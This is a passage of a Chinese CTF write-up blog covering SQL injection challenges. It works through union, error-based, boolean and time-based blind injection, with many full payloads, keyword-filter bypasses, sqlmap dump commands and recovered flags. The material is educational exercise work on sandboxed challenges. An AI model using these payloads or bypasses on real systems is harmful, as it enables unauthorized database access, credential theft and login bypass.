在输入的用户名后添加单引号返回出错，猜测存在注入</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210617122257987.png" alt="image-20210617122257987"></p><p>2.判断注入类型</p><p>​            在用户名后输入1’ or 1#后成功进入，但还是没有拿到flag，因此继续尝试注入</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210617122350388.png" alt="image-20210617122350388"></p><p>3.判断字段数</p><p>​        当order by 4时出错，因此应有三个字段数</p><p>4.判断回显位</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210617122732266.png" alt="image-20210617122732266"></p><p>5。确定数据库名</p><p>​        为了获取所有数据库名，要利用group_concat()函数令其一次性显示出来</p><pre class="language-none"><code class="language-none">1&#39; union select 1,2,group_concat(database());#</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210617123129571.png" alt="image-20210617123129571"></p><p>6.确定表名</p><pre class="language-none"><code class="language-none">1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database();#</code></pre><p><strong>【INFORMATION_SCHEMA 数据库】</strong> 是MySQL自带的，它提供了访问数据库 <strong>元数据</strong> 的方式。元数据是关于数据的数据，如数据库名或表名，列的数据类型，或访问权限等。</p><p>常用字段</p><table><thead><tr><th>字段</th><th>含义</th></tr></thead><tbody><tr><td>Table_catalog</td><td>数据表登记目录</td></tr><tr><td>Table_schema</td><td>数据表所属的数据库名</td></tr><tr><td>Table_name</td><td>表名称</td></tr><tr><td>Table_type</td><td>表类型[system view|base table]</td></tr><tr><td>Engine</td><td>使用的数据库引擎[MyISAM|CSV|InnoDB]</td></tr><tr><td>Version</td><td>版本，默认值10</td></tr><tr><td>Row_format</td><td>行格式[Compact|Dynamic|Fixed]</td></tr><tr><td>Table_rows</td><td>表里所存多少行数据</td></tr><tr><td>Avg_row_length</td><td>平均行长度</td></tr><tr><td>Data_length</td><td>数据长度</td></tr><tr><td>Max_data_length</td><td>最大数据长度</td></tr><tr><td>Index_length</td><td>索引长度</td></tr><tr><td>Data_free</td><td>空间碎片</td></tr><tr><td>Auto_increment</td><td>做自增主键的自动增量当前值</td></tr><tr><td>Create_time</td><td>表的创建时间</td></tr><tr><td>Update_time</td><td>表的更新时间</td></tr><tr><td>Check_time</td><td>表的检查时间</td></tr><tr><td>Table_collation</td><td>表的字符校验编码集</td></tr><tr><td>Checksum</td><td>校验和</td></tr><tr><td>Create_options</td><td>创建选项</td></tr><tr><td>Table_comment</td><td>表的注释、备注</td></tr></tbody></table><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210617123612820.png" alt="image-20210617123612820"></p><ol start="7"><li><p>确定字段名</p><p>猜测flag应该在l0ve1ysq1表中，因此查找该表内的字段名</p><pre class="language-sql" data-language="sql"><code class="language-sql">1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;l0ve1ysq1&#39;;#</code></pre></li></ol><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210617164130341.png" alt="image-20210617164130341"></p><p>8.拿到数据</p><p>查找这三列中的全部数据，利用group_concat();</p><pre class="language-sql" data-language="sql"><code class="language-sql">1&#39; union select 1,2,group_concat(id,username,password) from l0ve1ysq1#;</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210617164638259.png" alt="image-20210617164638259"></p><p>得到flag</p><p><strong>MySQL默认有“information_schema”的数据库，该库中有三个表名：</strong></p><p>1、SCHEMATA：存储该用户创建的所有数据库的库名，记录库名的字段为SCHEMA_NAME。<br>2、TABLES：存储该用户创建的所有数据库的库名和表名，记录库名和表名的字段为TABLE_SCHEMA和TABLE_NAME。<br>3、COLUMNS：存储该用户创建的所有数据库的库名、表名和字段名，库名、表名和字段名为TABLE_SCHEMA、TABLE_NAME和COLUMN_NAME。</p><h2 id="ctfhub—SQL-整数型注入"><a href="#ctfhub—SQL-整数型注入" class="headerlink" title="ctfhub—SQL 整数型注入"></a>ctfhub—SQL 整数型注入</h2><p>输入1有回显</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210617171453199.png" alt="image-20210617171453199"></p><p>输入1 and 1=2无回显，既存在注入点，整数型注入</p><p>利用order by可知存在两个字段</p><p>利用联合查询查询数据库名称</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210617171639524.png" alt="image-20210617171639524"></p><p>再查找表名</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210617171824424.png" alt="image-20210617171824424"></p><p>flag应该就在flag表内，再查找字段名</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210617171902588.png" alt="image-20210617171902588"></p><p>最后得到flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210617171939691.png" alt="image-20210617171939691"></p><h2 id="ctfhub—SQL字符型注入"><a href="#ctfhub—SQL字符型注入" class="headerlink" title="ctfhub—SQL字符型注入"></a>ctfhub—SQL字符型注入</h2><p>利用order by判断字段数</p><p>输入-1&#39; union select 1,2#判断回显位置</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210617225730001.png" alt="image-20210617225730001"></p><p>查数据库名</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210617221940482.png" alt="image-20210617221940482"></p><p>查表名</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210617221849032.png" alt="image-20210617221849032"></p><p>查字段名</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210617224854046.png" alt="image-20210617224854046"></p><p>查flag        -1&#39; union select 1,group_concat(flag) from flag#</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210617225605950.png" alt="image-20210617225605950"></p><p>感觉和整数型注入差不多</p><h2 id="ctfhub—报错注入"><a href="#ctfhub—报错注入" class="headerlink" title="ctfhub—报错注入"></a>ctfhub—报错注入</h2><p>利用xpath语法错误来进行报错注入主要利用<code>extractvalue</code>和<code>updatexml</code>两个函数。</p><p><strong>extractvalue()</strong></p><pre class="language-none"><code class="language-none">函数原型：extractvalue(xml_document,Xpath_string)正常语法：extractvalue(xml_document,Xpath_string);第一个参数：xml_document是string格式，为xml文档对象的名称第二个参数：Xpath_string是xpath格式的字符串作用：从目标xml中返回包含所查询值的字符串</code></pre><p>第二个参数 xml中的位置是可操作的地方，xml文档中查找字符位置是用 /xxx/xxx/xxx/…这种格式，如果我们写入其他格式，就会报错，并且会返回我们写入的非法格式内容，而这个非法的内容就是我们想要查询的内容</p><p>payload模板</p><pre class="language-none"><code class="language-none">&#39; and extractvalue(1,concat(0x7e,(select @@version),0x7e))</code></pre><ol><li>0x7e=’~’</li><li>concat(‘a’,‘b’)=“ab”</li><li>version()=@@version</li><li> ‘~‘可以换成’#’、’$&#39;等不满足xpath格式的字符</li><li> extractvalue()能查询字符串的最大长度为32，如果我们想要的结果超过32，就要用substring()函数截取或limit分页，一次查看最多32位</li></ol><p>返回结果不能超过一条</p><p>若超过则需再查询语句后添加limit x,1或用group_concat()函数</p><p><strong>updatexml()</strong></p><p>updatexml()函数与extractvalue()类似，是更新xml文档的函数。</p><p>and 1=(updataxml(1,concat(0x7e,(sql_inject),0x7e),1))</p><p><strong>flood()</strong></p><p>原理还没看明白（</p><p>先放个模板在这</p><pre class="language-none"><code class="language-none">1 Union select count(*),concat((查询语句),0x26,floor(rand(0)*2))x from information_schema.columns group by x;</code></pre><p><strong>题目：</strong></p><p><strong>利用extractvalue</strong></p><p>输入单引号提示语法错误，输入and 1=1能正确查询，猜测为数字型，利用extractvalue函数爆库名</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210618145637443.png" alt="image-20210618145637443"></p><p>再爆表名</p><p>这里提示太长因此利用group_concat()函数</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210618150129458.png" alt="image-20210618150129458"></p><p>猜到flag再flag表内爆列名</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210618150241862.png" alt="image-20210618150241862"></p><p>最后查询内容</p><p>1 and extractvalue(1,concat(0x7e,(select flag from flag limit 0,1),0x7e))</p><p>由于extractvalue函数只能显示32位字符，所以要利用substring函数进行分割</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210618150615881.png" alt="image-20210618150615881"></p><p>利用substring查看右边31位字符</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210618181313759.png" alt="image-20210618181313759"></p><p>最后可以拿到flag</p><p>ctfhub{ff3bb0327849e1b9e0e6abfd}</p><p><strong>利用updataxml函数</strong></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210618181744673.png" alt="image-20210618181744673"></p><p><strong>利用flood函数</strong></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210618182036292.png" alt="image-20210618182036292"></p><h2 id="ctfhub—布尔盲注"><a href="#ctfhub—布尔盲注" class="headerlink" title="ctfhub—布尔盲注"></a>ctfhub—布尔盲注</h2><p>只有出现数据提交正确和错误两种不同的页面（报错型至少语法错误会回显错误到页面上）或者无法使用联合查询。</p><p><strong>步骤</strong></p><ol><li>用错误和正确两种反馈进行逐一试验，猜测出闭合</li><li>利用length来逐一测试字符串的长度</li><li>利用substr来逐一的测试，测试库名、表名、列名和其他数据</li><li>最后得到数据</li></ol><p>函数</p><pre class="language-none"><code class="language-none">length()返回字符串的长度length(abc)返回3，表示abc字符串长度为3substr()截取字符串substr(abc,1,1)返回a，从abc的第一位开始截取，步长为1mid()取出字符串的一部分值mid(abc,1,1)返回a，从abc的第一位开始取，步长为1，与substr()用法一致left()取出字符串左边的几个数据left(abc,1)返回aleft(abc,2)返回abright()取出右边的几个数据right(abc,1)返回cright(abc,2)返回bcord() 与ascii()返回一个字符的ascii码值ascii(s)返回114hex()返回16进制数</code></pre><p>先猜数据库长度&gt;3时返回成功，&gt;4时返回失败可以得到数据库名长度为4</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210618213033658.png" alt="image-20210618213033658"></p><p>接下来利用substr和ascii函数猜名字</p><p>首字母ascii码大于114时返回成功，大于115时返回失败，可得到首字母的ascii码为115，为s</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210618213347153.png" alt="image-20210618213347153"></p><p>第二位同理可以得到ascii码值为113，为q</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210618213535384.png" alt="image-20210618213535384"></p><p>最后可得数据库名为sqli</p><p>再猜表名</p><p>1 and substr((select table_name from information_schema.tables where table_schema=&#39;sqli&#39; limit 0,1),1,1)=&#39;n&#39;</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210618214343490.png" alt="image-20210618214343490"></p><p>（感觉这部分应该用bp抓包爆破更方便）</p><p>把limit后的0改为1猜第二个表名</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210618214721333.png" alt="image-20210618214721333"></p><p>最后能得到有news和flag两个表</p><p>再猜字段</p><p>首字母ascii码为102，为f</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210618215609088.png" alt="image-20210618215609088"></p><p>同理能得到字段名为flag</p><p>最后爆内容</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210618222859475.png" alt="image-20210618222859475"></p><p>太多了，用bp爆破完感觉也很难找，估计用py写脚本会方便很多</p><p><strong>用sqlmap：</strong></p><p>-u <a href="http://challenge-b896931f16bb5e67.sandbox.ctfhub.com:10800/?id=1">http://challenge-b896931f16bb5e67.sandbox.ctfhub.com:10800/?id=1</a> --dbs查库名</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210618224516739.png" alt="image-20210618224516739"></p><p>-u <a href="http://challenge-b896931f16bb5e67.sandbox.ctfhub.com:10800/?id=1">http://challenge-b896931f16bb5e67.sandbox.ctfhub.com:10800/?id=1</a> -D sqli --tables</p><p>查表名</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210618224721120.png" alt="image-20210618224721120"></p><p>-u <a href="http://challenge-b896931f16bb5e67.sandbox.ctfhub.com:10800/?id=1">http://challenge-b896931f16bb5e67.sandbox.ctfhub.com:10800/?id=1</a> -D sqli -T flag --columns查字段名</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210618225207129.png" alt="image-20210618225207129"></p><p>-u <a href="http://challenge-b896931f16bb5e67.sandbox.ctfhub.com:10800/?id=1">http://challenge-b896931f16bb5e67.sandbox.ctfhub.com:10800/?id=1</a> -D sqli -T flag -C flag --dump查值</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210618225706653.png" alt="image-20210618225706653"></p><h2 id="ctfhub—时间盲注"><a href="#ctfhub—时间盲注" class="headerlink" title="ctfhub—时间盲注"></a>ctfhub—时间盲注</h2><p>利用sleep函数进行盲注</p><p>若and之前的语句正确则成功执行sleep</p><p>能得到是数字型注入</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210619153620142.png" alt="image-20210619153620142"></p><p>接下来利用if语句进行注入是否成功的判断1 and if(查询语句,sleep(2),1)</p><p>若为真则执行sleep（2），若为假则执行1</p><p>接下来步骤与布尔盲注相似</p><p>猜数据库名（也可以利用ascii码来猜，但因为ctfhub的sql题名称都一样，就直接试字符了）</p><p>1 and if(substr(database(),1,1)=&#39;s&#39;,sleep(2),1)#</p><p>猜表的数量</p><p>1 and if((select count(table_name) from information_schema.tables  where table_schema=database())=2,sleep(2),1)#</p><p>猜表名</p><p>1 and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;0,sleep(2),1)#</p><p>将limit后的0改为1再猜第二个表名</p><p>分别为news 和 flag</p><p>猜flag表内字段数量</p><p>1 and if((select count(column_name) from information_schema.columns  where table_name=&#39;flag&#39;)=1,sleep(2),1)#</p><p>猜字段名</p><p>1 and if(ascii(substr((select column_name from information_schema.columns where table_name=&#39;flag&#39; limit 0,1),1,1))&gt;102,sleep(2),1)#</p><p>最终可以猜出字段名为flag</p><p>再猜内容</p><p>1 and if(ascii(substr((select flag from flag limit 0,1),1,1))&gt;99,sleep(2),1)#</p><p>这部分应该还是要用python或者sqlmap</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210619160201466.png" alt="image-20210619160201466"></p><h2 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h2><p>看题目就知道空格被过滤了，这里可以利用/**/注释符来替代空格，其他步骤和字符型注入一样</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210620113251958.png" alt="image-20210620113251958"></p><p>最后得到flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210620113632138.png" alt="image-20210620113632138"></p><p>贴个别人总结的过滤和绕过</p><p><a href="https://blog.csdn.net/weixin_44300286/article/details/96597167?utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.control&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.control">SQL注入一些过滤及绕过总结_obsetear的博客-CSDN博客</a></p><h2 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h2><p>看到界面提示存在过滤</p><p>输入1&#39; and 1=1# 1‘ or 1#  1&#39; and select 1 from 1#等语句根据返回的错误信息可以知道过滤了select or and union from by where</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210619173714989.png" alt="image-20210619173714989"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210619173908385.png" alt="image-20210619173908385"></p><p>这里可以利用双写绕过，首先利用order by查字段数可以查到表内有三列</p><p>1&#39; oorrder bbyy 4;#</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210619174055661.png" alt="image-20210619174055661"></p><p>接下来可以利用联合查询</p><p>先看回显1&#39; ununionion selselectect 1,2,3;#</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210619174226243.png" alt="image-20210619174226243"></p><p>查库名1&#39; ununionion selselectect 1,2,database();#</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210619174351658.png" alt="image-20210619174351658"></p><p>查表名</p><p>1&#39; ununionion selselectect 1,2,(selselectect group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema=database());#</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210619174759820.png" alt="image-20210619174759820"></p><p>flag应该在b4bsql表里，爆一下列名</p><p>1&#39; ununionion selselectect 1,2,(selselectect group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_name=&#39;b4bsql&#39;);#</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210619175029086.png" alt="image-20210619175029086"></p><p>最后爆内容1&#39; ununionion selselectect 1,2,(selselectect group_concat(id,username,passwoorrd) frfromom b4bsql);#</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210619175306597.png" alt="image-20210619175306597"></p><h2 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h2><p>试了一下，and union 空格 等于都被过滤了尝试了几种绕过姿势都没成功，看了下别人的wp说是报错注入</p><p>利用括号来去掉查询语句中的空格</p><p>先查库</p><p>0&#39;or(extractvalue(1,concat(0x7e,(database()),0x7e)))#</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210619181915074.png" alt="image-20210619181915074"></p><p>再查表</p><p>由于等于号也被过滤了，所以要用like</p><p>admin&#39;or(extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where((table_schema)like(database()))),0x7e)))#</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210619184507074.png" alt="image-20210619184507074"></p><p>爆列名</p><p>admin&#39;or(extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where((table_name)like(&#39;H4rDsq1&#39;))),0x7e)))#</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210619184801079.png" alt="image-20210619184801079"></p><p>最后爆内容</p><p>admin&#39;or(extractvalue(1,concat(0x7e,(select(group_concat(id,username,password))from(H4rDsq1)),0x7e)))#</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210619185705420.png" alt="image-20210619185705420"></p><p>flag{66f2f5cd-207d-4d50-87</p><p>由于extractvalue显示字符数的限制，要用substr函数对其进行分割</p><p>admin&#39;or(extractvalue(1,concat(0x7e,right((select(group_concat(id,username,password))from(H4rDsq1)),31),0x7e)))#</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210619190153350.png" alt="image-20210619190153350"></p><p>cd-207d-4d50-87bd-d8b762ffce95}</p><p>最后拼一下得到flag</p><p>flag{66f2f5cd-207d-4d50-87bd-d8b762ffce95}</p><h2 id="SWPU2019-Web1"><a href="#SWPU2019-Web1" class="headerlink" title="[SWPU2019]Web1"></a>[SWPU2019]Web1</h2><p>进入后是个登录页面，注册个账号之后登录</p><p>可以知道注入点在广告位上</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210619214559474.png" alt="image-20210619214559474"></p><p>试一下可以知道or and #都被过滤了</p><p>因为过滤了＃号，所以要保证后面的单引号能闭合</p><pre class="language-sql" data-language="sql"><code class="language-sql">0&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&amp;&amp;‘1’&#x3D;‘1</code></pre><p>得到回显位置2，3.</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210619220207345.png" alt="image-20210619220207345"></p><p><strong>因为or被过滤，且无法通过大小写和双写绕过，那么information_schema因为含有or，所以也没法使用。</strong>这里有两种方法可以绕过</p><p><a href="https://www.cnblogs.com/20175211lyz/p/12358725.html">SQL注入：限制条件下获取表名、无列名注入 - MustaphaMond - 博客园 (cnblogs.com)</a></p><p>InnoDb引擎<br>从MYSQL5.5.8开始，InnoDB成为其默认存储引擎。而在MYSQL5.6以上的版本中，inndb增加了innodb_index_stats和innodb_table_stats两张表，这两张表中都存储了数据库和其数据表的信息，但是没有存储列名。<br>sys数据库<br>在5.7以上的MYSQL中，新增了sys数据库，该库的基础数据来自information_schema和performance_chema，其本身不存储数据。可以通过其中的schema_auto_increment_columns来获取表名。</p><p>sys数据库需要root权限，而innoDb在mysql中默认关闭</p><p>限制：<br><strong>mysql ≥ 5.7版本</strong></p><p>先查一下数据库版本</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210619221524942.png" alt="image-20210619221524942"></p><p>因此可以利用innoDb来查表名</p><p>系统Mysql库中存在两张与innodb相关的表：<code>innodb_table_stats</code>和<code>innodb_index_stats</code>。</p><p>所以可以通过查找这两个表取代information的作用</p><pre class="language-sql" data-language="sql"><code class="language-sql">0&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,group_concat(table_name),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#x2F;**&#x2F;from&#x2F;**&#x2F;mysql.innodb_table_stats&#x2F;**&#x2F;where&#x2F;**&#x2F;database_name&#x3D;database()&amp;&amp;&#39;1&#39;&#x3D;&#39;1</code></pre><p>或</p><pre class="language-sql" data-language="sql"><code class="language-sql">0&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,group_concat(table_name),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#x2F;**&#x2F;from&#x2F;**&#x2F;mysql.innodb_index_stats&#x2F;**&#x2F;where&#x2F;**&#x2F;database_name&#x3D;database()&amp;&amp;&#39;1&#39;&#x3D;&#39;1</code></pre><p>得到表名为ads和users</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210619223630074.png" alt="image-20210619223630074"></p><p>猜flag在users表内，进行无列名注入</p><p><strong>无列名注入原理</strong></p><p>无列名注入的原理就是在取别名的同时查询数据。通过无列名查询构造一个虚拟表，在构造此表的同时查询其中的数据。</p><p>表的列数也要一次次试</p><p>（不太懂为啥这里的列数不是22)</p><p><a href="https://zhuanlan.zhihu.com/p/98206699">CTF|mysql之无列名注入 - 知乎 (zhihu.com)</a></p><p>[<a href="https://www.cnblogs.com/wangtanzhi/p/12241499.html">SWPU2019]Web1 - 王叹之 - 博客园 (cnblogs.com)</a></p><pre class="language-sql" data-language="sql"><code class="language-sql">0&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,(select&#x2F;**&#x2F;group_concat(&#96;3&#96;)&#x2F;**&#x2F;from&#x2F;**&#x2F;(select&#x2F;**&#x2F;1,2,3&#x2F;**&#x2F;union&#x2F;**&#x2F;select*from&#x2F;**&#x2F;users)a),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&amp;&amp;&#39;1&#39;&#x3D;&#39;1</code></pre><p>如果反引号被过滤，就要对字段利用别名替代</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210619234252501.png" alt="image-20210619234252501"></p><p><strong>还可以利用join爆列名</strong></p><p>join后的列名是两个表列名加起来的，可能会产⽣相同的列名，如id和name，使⽤别名时，表中不能出现同的字段名，这就跟join第⼀个特点相冲突，所以在join和别名同时使⽤时会导致报错</p><p>当通过查询得到新的表时，必须有一个别名，即每个派生出来的表都必须有一个自己的别名</p><h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><p><strong>原理</strong></p><p>二次注入可以理解为，攻击者构造的恶意数据存储在数据库后，恶意数据被读取并进入到SQL查询语句所导致的注入。防御者可能在用户输入恶意数据时对其中的特殊字符进行了转义处理，但在恶意数据插入到数据库时被处理的数据又被还原并存储在数据库中，当Web程序调用存储在数据库中的恶意数据并执行SQL查询时，就发生了SQL二次注入。</p><p><strong>二次注入，可以概括为以下两步:</strong></p><ul><li>第一步：插入恶意数据<br> 进行数据库插入数据时，对其中的特殊字符进行了转义处理，在写入数据库的时候又保留了原来的数据。</li><li>第二步：引用恶意数据<br> 开发者默认存入数据库的数据都是安全的，在进行查询时，直接从数据库中取出恶意数据，没有进行进一步的检验的处理。</li></ul><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210621110912304.png" alt="image-20210621110912304"></p><h2 id="记考核赛的一次sql盲注"><a href="#记考核赛的一次sql盲注" class="headerlink" title="记考核赛的一次sql盲注"></a>记考核赛的一次sql盲注</h2><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210821170913431.png" alt="image-20210821170913431"></p><p>(strcmp(ascii(substr(REVERSE(tceles)(table_name)from(mysql.innodb_table_stats)where((table_schema)like(database())),1,1)),10000))%23</p><p>||strcmp(ascii(substr((select(table_name)from(mysql.innodb_table_stats))where((database_name)like(database())),1,1)),1)%23</p><p>username=admin&amp;password=||((ascii(mid((pwd)from(1))))like(12))%23</p><p>YouAresOgOoD</p><p>select(table_name)from(information_schema.tables)where(table_schema=database())</p><p>||(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),§1§,1))=§0§)%23</p><p>flag_1s_her3</p><p>||(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=0x666c61675f31735f68657233)),§1§,1))=§0§)%23</p><p>flag{sql1_1s_s0_ea3y}</p><h2 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h2><p>sql注入，先用fuzz测一下过滤（buu的网站好像有访问限制，所以post到后面之后因为请求太多了会直接报429，而且不知道是不是bp的问题有些没有过滤的也会被显示为被过滤了</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20210724095707401.png" alt="image-20210724095707401"></p><p>这里应该要采用bool盲注的方式，但是过滤的东西有点多</p><p>因为空格被过滤了所以要利用（）来代替空格</p><p>抄了个脚本</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20210724131620633.png" alt="image-20210724131620633"></p><p>感觉是很简单的盲注，然后要利用python编脚本</p><h2 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h2><p> <a href="https://blog.csdn.net/qq_45521281/article/details/107167452">GXYCTF2019]BabySQli——“绕过md5比较”_WHOAMIAnony的博客-CSDN博客</a></p><p>当用户名为admin时，提示密码错误，因此能知道用户名为admin</p><p>登录后跳转到search.php中，在源码里存在一个进行base加密的提示</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20210724153525231.png" alt="image-20210724153525231"></p><p>sql注入，先fuzz看一下过滤</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20210724152502898.png" alt="image-20210724152502898"></p><p>然后可以利用大写绕过查到共有3列（其实直接union试也可以</p><p>之后要利用联合注入</p><p><strong>在联合查询并不存在的数据时，联合查询就会构造一个虚拟的数据。</strong></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20210724152803276.png" alt="image-20210724152803276"></p><p>后端代码</p><pre class="language-none"><code class="language-none">&lt;?php$row;$pass&#x3D;$_POST[&#39;pw&#39;];if($row[&#39;username&#39;]&#x3D;&#x3D;’admin’)&#123;if($row[&#39;password&#39;]&#x3D;&#x3D;md5($pass))&#123; echo $flag; &#125;else&#123; echo “wrong pass!”; &#125;&#125;else&#123; echo “wrong user!”;&#125;</code></pre><p>所以可以在联合查询时构造虚拟的数据利用这个数据进行登录操作</p><pre class="language-none"><code class="language-none">username&#x3D;0&#39; union select 1,&#39;admin&#39;,&#39;202cb962ac59075b964b07152d234b70&#39; #password&#x3D;123</code></pre><p>得到flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20210724153406008.png" alt="image-20210724153406008"></p><h2 id="GYCTF2020-Blacklist"><a href="#GYCTF2020-Blacklist" class="headerlink" title="[GYCTF2020]Blacklist"></a>[GYCTF2020]Blacklist</h2><p>这个看起来和强网杯那个有点像</p><p>同样也是堆叠注入</p><p>可以用</p><p>1&#39;;show tables;#查表</p><p><img 